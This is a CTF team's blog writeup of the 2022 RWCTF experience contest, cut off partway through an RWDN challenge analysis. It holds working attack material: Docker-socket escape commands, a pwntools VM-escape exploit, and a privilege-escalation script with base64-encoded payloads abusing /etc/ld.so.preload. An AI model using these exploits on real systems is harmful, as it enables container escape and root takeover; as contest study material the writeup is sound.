<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>2022 RWCTF体验赛 SU Writeup - su-team</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="su-team"><meta name="msapplication-TileImage" content="/img/SU4.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="su-team"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="本次2022 RWCTF 体验赛 我们 SU 取得了第一名 🏆的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)以下是我们 SU 本次 2022 RWCTF的 writeup 以及RWCTF RWDN 复现解析"><meta property="og:type" content="blog"><meta property="og:title" content="2022 RWCTF体验赛 SU Writeup"><meta property="og:url" content="https://team-su.github.io/posts/24249.html"><meta property="og:site_name" content="su-team"><meta property="og:description" content="本次2022 RWCTF 体验赛 我们 SU 取得了第一名 🏆的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)以下是我们 SU 本次 2022 RWCTF的 writeup 以及RWCTF RWDN 复现解析"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://team-su.github.io/images/2022-1-22-RWCTF/1.png"><meta property="article:published_time" content="2022-01-30T08:50:17.000Z"><meta property="article:modified_time" content="2025-07-13T11:51:23.024Z"><meta property="article:author" content="SUers"><meta property="article:tag" content="RWCTF"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://team-su.github.io/images/2022-1-22-RWCTF/1.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://team-su.github.io/posts/24249.html"},"headline":"2022 RWCTF体验赛 SU Writeup","image":["https://team-su.github.io/images/2022-1-22-RWCTF/1.png"],"datePublished":"2022-01-30T08:50:17.000Z","dateModified":"2025-07-13T11:51:23.024Z","author":{"@type":"Person","name":"SUers"},"publisher":{"@type":"Organization","name":"su-team","logo":{"@type":"ImageObject","url":"https://team-su.github.io/img/SU4.jpg"}},"description":"本次2022 RWCTF 体验赛 我们 SU 取得了第一名 🏆的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)以下是我们 SU 本次 2022 RWCTF的 writeup 以及RWCTF RWDN 复现解析"}</script><link rel="canonical" href="https://team-su.github.io/posts/24249.html"><link rel="alternate" href="/atom.xml" title="su-team" type="application/atom+xml"><link rel="icon" href="/img/SU4.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-1-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/members">Members</a><a class="navbar-item" href="https://forms.office.com/r/YxbUJJ3i78">Join</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="RSS Feed" href="/atom.xml"><i class="fas fa-rss"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-12"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-01-30T08:50:17.000Z" title="2022/1/30 16:50:17">2022-01-30</time></span><span class="level-item">Updated&nbsp;<time dateTime="2025-07-13T11:51:23.024Z" title="2025/7/13 19:51:23">2025-07-13</time></span><span class="level-item">31 minutes read (About 4704 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">2022 RWCTF体验赛 SU Writeup</h1><div class="content"><p>本次2022 RWCTF 体验赛 我们 SU 取得了第一名 🏆的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:&#115;&#117;&#101;&#114;&#115;&#x5f;&#120;&#99;&#x74;&#x66;&#x40;&#x31;&#x32;&#54;&#46;&#x63;&#x6f;&#109;">suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770)<br>以下是我们 SU 本次 2022 RWCTF的 writeup 以及RWCTF RWDN 复现解析</p>
<span id="more"></span>
<hr>
<p>本次2022 RWCTF 体验赛 我们 SU 取得了第一名 🏆的好成绩，感谢队里师傅们的辛苦付出！<br><img src="../images/2022-1-22-RWCTF/1.png"><br>同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:&#x73;&#117;&#x65;&#x72;&#x73;&#x5f;&#120;&#x63;&#x74;&#x66;&#x40;&#x31;&#x32;&#x36;&#x2e;&#x63;&#x6f;&#109;">suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770)<br>以下是我们 SU 本次 2022 RWCTF体验赛 的 writeup 以及RWCTF RWDN 复现解析</p>
<div class="toc">

<!-- toc -->

<ul>
<li><a href="#pwn">pwn</a><ul>
<li><a href="#remote-debug-server">Remote-debug-Server</a></li>
<li><a href="#be-a-docker-escaper">Be-a-Docker-Escaper</a></li>
<li><a href="#be-a-vm-escaper">Be-a-VM-Escaper</a></li>
<li><a href="#phonograph">Phonograph</a></li>
</ul>
</li>
<li><a href="#web">WEB</a></li>
<li><a href="#realworld-ctf-2022-rwdn-fu-xian-jie-xi">Realworld CTF 2022 - RWDN 复现解析</a><ul>
<li><a href="#qian-qing-ti-yao">前情提要</a></li>
<li><a href="#na-dao-ti-mu">拿到题目</a><ul>
<li><a href="#source-shen-ji">source 审计</a></li>
<li><a href="#check-shen-ji">check 审计</a></li>
<li><a href="#kan-yi-yan-31338-duan-kou">看一眼 31338 端口</a></li>
</ul>
</li>
<li><a href="#si-lu-he-li-yong">思路和利用</a><ul>
<li><a href="#di-yi-bu-fen">第一部分</a><ul>
<li><a href="#errordocument">ErrorDocument</a></li>
<li><a href="#shang-chuan-wen-jian">上传文件</a></li>
</ul>
</li>
<li><a href="#di-er-bu-fen">第二部分</a><ul>
<li><a href="#apache2-conf-shen-ji">apache2.conf审计</a></li>
</ul>
</li>
<li><a href="#htaccess-lan-yong-gua-zai-ld-perload">htaccess 滥用 挂载 LD_PERLOAD</a></li>
</ul>
</li>
<li><a href="#zui-hou-getshell-readflag">最后 Getshell readflag</a></li>
<li><a href="#wrap-up">Wrap up</a></li>
</ul>
</li>
</ul>
<!-- tocstop -->

</div>


<h1><span id="pwn">pwn</span><a href="#pwn" class="header-anchor"></a></h1><h3><span id="remote-debug-server">Remote-debug-Server</span><a href="#remote-debug-server" class="header-anchor"></a></h3><p>直接 remote get &#x2F;flag flag </p>
<h3><span id="be-a-docker-escaper">Be-a-Docker-Escaper</span><a href="#be-a-docker-escaper" class="header-anchor"></a></h3><p>docker逃逸,参考 <a href="https://www.anquanke.com/post/id/179623#h2-3">这篇文章</a> 发现题目提供的dockerfile中有  <code>docker run -i -m 128m -v /var/run/docker.sock:/s ubuntu # You are here!</code>这一行 将docker.sock映射到docker中的&#x2F;s目录下,因此和文章中一样操作即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install docker.io</span><br><span class="line"><span class="built_in">mkdir</span> /aa</span><br><span class="line">docker -H unix:///s/docker.sock run -v /:/aa -i ubuntu /bin/bash</span><br></pre></td></tr></table></figure>
<p>Docker run命令-it的话会出现报错<code>the input device is not a TTY</code><br>搜索后发现去掉-t就行了<br>之后cd &#x2F;aa 即可进入映射的宿主机目录cat flag</p>
<h3><span id="be-a-vm-escaper">Be-a-VM-Escaper</span><a href="#be-a-vm-escaper" class="header-anchor"></a></h3><p>虚拟机题目 给了源码<code>https://github.com/erratic-c-programmer/lvm</code><br>审源码的时候发现栈的检测很严格,但是reg寄存器数组没有检测负溢出.<br>同时reg的索引是longlong类型,可以负溢出修改低地址的内容<br>动态调试发现reg数组低地址的局部变量只有<code>cinstr</code>即rip的内容,因此无法动态修改虚拟机的栈和代码.<br>通过负索引获取栈地址和libc地址,通过sub命令算出偏移,然后通过修改rip使vm跳转到布置好的代码处写printf函数调用的<code>io_file_jumps</code>vtable中的_IO_xputs函数指针为one_gadget即可.<br>布置代码我的选择是正常写在reg数组中,reg数组可以写三条指令,刚好够load + store + print</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"><span class="comment"># sh = process(&#x27;./lvm&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&quot;101.132.235.138&quot;</span>,<span class="number">1337</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="built_in">len</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">global</span> <span class="built_in">len</span></span><br><span class="line">    payload =<span class="string">&quot;&quot;</span></span><br><span class="line">    payload += <span class="built_in">str</span>(<span class="number">1</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    payload += <span class="built_in">str</span>(num) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="built_in">len</span> +=<span class="number">1</span> </span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">idx</span>):</span><br><span class="line">    <span class="keyword">global</span> <span class="built_in">len</span></span><br><span class="line"></span><br><span class="line">    payload =<span class="string">&quot;&quot;</span></span><br><span class="line">    payload += <span class="built_in">str</span>(<span class="number">4</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    payload += <span class="built_in">str</span>(idx) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="built_in">len</span> +=<span class="number">1</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">idx</span>):</span><br><span class="line">    <span class="keyword">global</span> <span class="built_in">len</span></span><br><span class="line">    <span class="built_in">len</span> +=<span class="number">1</span> </span><br><span class="line">    payload =<span class="string">&quot;&quot;</span></span><br><span class="line">    payload += <span class="built_in">str</span>(<span class="number">5</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    payload += <span class="built_in">str</span>(idx) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    <span class="keyword">global</span> <span class="built_in">len</span></span><br><span class="line">    <span class="built_in">len</span> +=<span class="number">1</span> </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(<span class="number">22</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>():</span><br><span class="line">    <span class="keyword">global</span> <span class="built_in">len</span></span><br><span class="line">    <span class="built_in">len</span> +=<span class="number">1</span> </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(<span class="number">7</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    <span class="keyword">global</span> <span class="built_in">len</span></span><br><span class="line">    <span class="built_in">len</span> +=<span class="number">1</span> </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(<span class="number">6</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">div</span>():</span><br><span class="line">    <span class="keyword">global</span> <span class="built_in">len</span></span><br><span class="line">    <span class="built_in">len</span> +=<span class="number">1</span> </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(<span class="number">9</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nop</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(<span class="number">0</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="comment"># 0x7FFFF7EA7C7E</span></span><br><span class="line"><span class="comment"># 0x7FFFF7EA7C81</span></span><br><span class="line"><span class="comment"># 0x7FFFF7EA7C84</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += load(-<span class="number">3</span>)</span><br><span class="line">payload += show()</span><br><span class="line">payload += push(<span class="number">0x13900</span>)</span><br><span class="line">payload += sub()</span><br><span class="line">payload += store(<span class="number">0</span>)</span><br><span class="line">payload += load(-<span class="number">35</span>)</span><br><span class="line">payload += show()</span><br><span class="line">payload += push(<span class="number">0x64ebf</span>)</span><br><span class="line">payload += sub()</span><br><span class="line">payload += push(<span class="number">0xe6c81</span>) <span class="comment"># onegadget </span></span><br><span class="line">payload += add()</span><br><span class="line">payload += store(<span class="number">1</span>)</span><br><span class="line">payload += push(<span class="number">0xe6c81</span>)</span><br><span class="line">payload += sub()</span><br><span class="line">payload += push(<span class="number">0x1ED4D8</span>) <span class="comment"># xputn</span></span><br><span class="line">payload += add()</span><br><span class="line">payload += store(<span class="number">3</span>)</span><br><span class="line">payload += load(<span class="number">3</span>)</span><br><span class="line">payload += load(<span class="number">0</span>)</span><br><span class="line">payload += sub() </span><br><span class="line">payload += push(<span class="number">8</span>)</span><br><span class="line">payload += div() <span class="comment"># off = (xputn - stack) / 8</span></span><br><span class="line">payload += store(<span class="number">6</span>)</span><br><span class="line">payload += push(<span class="number">4</span>)</span><br><span class="line">payload += store(<span class="number">5</span>)</span><br><span class="line">payload += push(<span class="number">0</span>)</span><br><span class="line">payload += store(<span class="number">7</span>)</span><br><span class="line">payload += push(<span class="number">22</span>)</span><br><span class="line">payload += store(<span class="number">8</span>)</span><br><span class="line">payload += push(<span class="number">5</span>)</span><br><span class="line">payload += store(<span class="number">2</span>)</span><br><span class="line">payload += push(<span class="number">1</span>)</span><br><span class="line">payload += store(<span class="number">3</span>)</span><br><span class="line">payload += push(<span class="number">0</span>)</span><br><span class="line">payload += store(<span class="number">4</span>)</span><br><span class="line">payload += load(<span class="number">0</span>)</span><br><span class="line">payload += push(<span class="number">0x8</span>)</span><br><span class="line">payload += sub()</span><br><span class="line">payload += store(-<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += store()</span></span><br><span class="line"></span><br><span class="line">nops = (<span class="built_in">str</span>(<span class="number">0</span>) + <span class="string">&#x27;\n&#x27;</span>)* (<span class="number">0x100</span> - <span class="built_in">len</span>)</span><br><span class="line"><span class="comment"># gdb.attach(sh,&#x27;b * $rebase(0x141B)&#x27;)</span></span><br><span class="line">sh.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>))</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># stack_base = int(sh.recvline(),10) - 0x13900</span></span><br><span class="line"><span class="comment"># log.success(&quot;stack = &quot; + hex(stack_base))</span></span><br><span class="line"><span class="comment"># libc_base = int(sh.recvline(),10)- 0x64ebf</span></span><br><span class="line"><span class="comment"># log.success(&quot;libc_base = &quot; + hex(libc_base)) </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io_list_all = libc_base + 0x1ec5a0</span></span><br><span class="line"><span class="comment"># recurive = libc_base + 0x23CF68</span></span><br><span class="line"><span class="comment"># xputn = libc_base + 0x92750</span></span><br><span class="line"><span class="comment"># one_gadget = </span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h3><span id="phonograph">Phonograph</span><a href="#phonograph" class="header-anchor"></a></h3><p>提权exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">base64 -d  &gt; /tmp/create.sh &lt;&lt;EOF</span><br><span class="line">IyEvYmluL2Jhc2gKYWxwaGE9ImEgYiBjIGQgZSBmIDAgMSAyIDMgNCA1IDYgNyA4IDkiCgpmb3Ig</span><br><span class="line">aSBpbiAkYWxwaGE7IGRvCmZvciBqIGluICRhbHBoYTsgZG8KZm9yIGsgaW4gJGFscGhhOyBkbwpm</span><br><span class="line">b3IgbCBpbiAkYWxwaGE7IGRvCiAgICBta2RpciAtcCAvdG1wL2xvZ18kaSRqJGskbAogICAgbG4g</span><br><span class="line">LXMgL2V0Yy9sZC5zby5wcmVsb2FkICAvdG1wL2xvZ18kaSRqJGskbC9kaWFyeS50eHQKZG9uZQpk</span><br><span class="line">b25lCmRvbmUKZG9uZQ==</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">chmod +x /tmp/create.sh</span><br><span class="line"></span><br><span class="line"># gcc inject.c -fPIC -shared -o exp.so -nostdlib</span><br><span class="line">#</span><br><span class="line"># #include &lt;stdio.h&gt;</span><br><span class="line"># #include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line"># __attribute__((constructor)) void exploit()  &#123;</span><br><span class="line">#     char buf[1000];</span><br><span class="line">#     if(!getenv(&quot;one&quot;)) &#123;</span><br><span class="line">#         return;</span><br><span class="line">#     &#125;</span><br><span class="line">#     unsetenv(&quot;one&quot;);</span><br><span class="line">#     setuid(0);</span><br><span class="line">#     setgid(0);</span><br><span class="line">#     system(&quot;chmod 777 /flag.txt&quot;);</span><br><span class="line"># &#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base64 -d &gt; /tmp/exp.so.gz &lt;&lt;EOF</span><br><span class="line">H4sICAsf7GEAA2V4cC5zbwDtW99vFFUUPrOz/QGFdlEMRYxuDCqQMCwCaakC25ZtVy1QC/UXD8O2</span><br><span class="line">O3SXdHeb7axueUA0SjDaBBNQX8RgQkI0Jv5M+qCxxpjoo3+CDyQYTSwYefDB8d6Zc2bn3p0JaAL6</span><br><span class="line">cL9k9pvz3fvde2fu7My0e+6LmZGhmKYBQYfdwKOPE16cRv2Z7X4VpvVCB/u8C1a7deMQjZNxkQHb</span><br><span class="line">5b6WQCxzhyZy0Oc2lURd4s9B5KCvlW0Lhhcv7Bb5tCYy+WLoW0Tf4m6R05rI7WiP43Yp5sUyy8OX</span><br><span class="line">fd9jPZnXg8h0Wg9etvP/pr9R9HVjgcxR/T3JfK1w86DpHcP+ouYhq4lM0xHHNvg1M7x/nM/LItf0</span><br><span class="line">QPlqjHn5Vx8+9d7bF85/erb+9I6riet7rr6/c5LXo/mk64Eb47TP8Hr9jZdvdByJEH1ZhP5QhJ6M</span><br><span class="line">0NdG6Hy8d8By/3t5mAqs+sx0pWjDlGVb5eehVp71dhjVinlOU5zmZm2rBI3z7B8/ojvtcRs0zrk7</span><br><span class="line">zoAeC+gbAroe0FMBPXhf6A3oLSHHp6CgoKCgoKCgoKBw6+HsiKUArjkP6Iy67oPfu+79s8ALrv38</span><br><span class="line">k+M4Z9xYc+Mf/Tjmxt/4se7Gn/hx3I0vUMxa/2gLb30vAMYXpfhdKT4nxfPBeDz72uXsS78usW6z</span><br><span class="line">87v6ugCuXGR9ZV9dtHuZsJELrzDha34cC/zjyhdi+BavPr9L5zWPs/1ftDM/fPtfnH4FBQUFBQUF</span><br><span class="line">BQUFBQUFhduCStmCyUKpkk/29PQktxydzk0Zdt0GbZ3+CP/Nl/9pf+U3xznCOLvkOKcZv8M4jf7V</span><br><span class="line">yNrxMdDqCW3dirb2MxrAPeBto6yu+1tlpjNxKja4sjU2xmp4vyc/yraT2DZ0JoY6ux/v6nih/STs</span><br><span class="line">ubtv07b193OZ/9yZZ9sCqzd6W86IgoKCgoKCgoKCgoKCwv8Ra5Epr3UdxpTf/MdfToXzEiavUu7p</span><br><span class="line">IiatUg5sN8bLMcb0ZOigcmQ/1zXtEeXE1pHp7+E25DU0nrioL+niOKn9ZVJ8q0F57DISmGecRE7R</span><br><span class="line">egDkUeThwcG+5IbxiVrZriV3GtuM1OatPTU33Hri4ZSR2r7Rk29iLDpofr66qMf8/HdR1/15FfW4</span><br><span class="line">P5+i3uLPu6i3+vMh6m3+vIl6e2iSts5m70io3sjbFvWORkK+oK/w8+9FfSWkQ/VO//oX9a7Q+dX5</span><br><span class="line">4NNh+qomzVtvcdVprh2uL3c9zf3e6X42H9eDbv3m8fD/DYXlwWci9JEI/WCE/hyE59NPRNSHYvmY</span><br><span class="line">NWkbk2DufXZ//77HBsE0h/ePm5msOTTWvy9jZveOgTk8cmCgf8Q8MDR0MHPIPNQ/MJIxGzn5mKOP</span><br><span class="line">yfiYmk8J/JiwD8bsXMnOTTC2qx4XaK9csS1jqlwzZqqVGatqzwWkiVpxOr+ZNeBGhdxsAYz8XJk1</span><br><span class="line">5rFdBaNqTed4gHsz0zbwD2PWmgTDtuosrFbyOTsHhlUwj1ZzJcss5KuNCIxiuWibuWo1N+c2mysV</span><br><span class="line">mXWqYnuNTVZKJatsh52/fwh+Hw+uOYhaz0Jol2JD8ketoyHIX/N+tl13nAr56T6zJPnJJ/f/BHjP</span><br><span class="line">DvLT/Yj4Eur8eaRB83OAX7d6wE/3LWJ6PhE0KT6MY/PHr4tM/cjjJ93CsgEqj4tMzztalyP7j4G0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1><span id="web">WEB</span><a href="#web" class="header-anchor"></a></h1><p>Hhhm大哥说太简单了，就一句话一题概括</p>
<ul>
<li>log4flag：log4shell 绕一下关键字过滤</li>
<li>Be-a-Database-Hacker：redis主从复制</li>
<li>the Secrets of Memory：spring actuator heapdump内存提取关键字符</li>
<li>Flag Console：weblogic cve</li>
<li>baby flaglab：gitlab前台rce</li>
<li>Be-a-Database-Hacker：h2 log4j2反序列化</li>
<li>Java Remote Debugger：java调试器rce</li>
<li>Ghost Shiro：tomcat ajp任意文件读+commonbeanuntil1.8.3反序列化链</li>
</ul>
<h1><span id="realworld-ctf-2022-rwdn-fu-xian-jie-xi">Realworld CTF 2022 - RWDN 复现解析</span><a href="#realworld-ctf-2022-rwdn-fu-xian-jie-xi" class="header-anchor"></a></h1><h2><span id="qian-qing-ti-yao">前情提要</span><a href="#qian-qing-ti-yao" class="header-anchor"></a></h2><p><a href="./realworld2022_RWDN.zip">RWDN dockerfile</a> 这份 dockerfile 是从 出题人 手中拿到的 和现实的题目 有点点差距的地方</p>
<p>使用 <code>sudo docker compose up</code> 等待镜像制作完成就会自动启动了</p>
<p>题目会部署在 127.0.0.1 31337 和 31338 两个端口 和正式比赛的情况 没有区别</p>
<h2><span id="na-dao-ti-mu">拿到题目</span><a href="#na-dao-ti-mu" class="header-anchor"></a></h2><h3><span id="source-shen-ji">source 审计</span><a href="#source-shen-ji" class="header-anchor"></a></h3><p>先查看 HTML 源码 很快就能看到注释中写的 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- /source --&gt;</span><br></pre></td></tr></table></figure>

<p>很显然是提示我们去访问 &#x2F;source 目录</p>
<p>curl 看一下 是 js 源码 这里顺手存到 source 文件里</p>
<p>注意: 源文件无注释 我这里为了提示也是为了分析题目 所以这里部分需要注意的地方 我添加了注释</p>
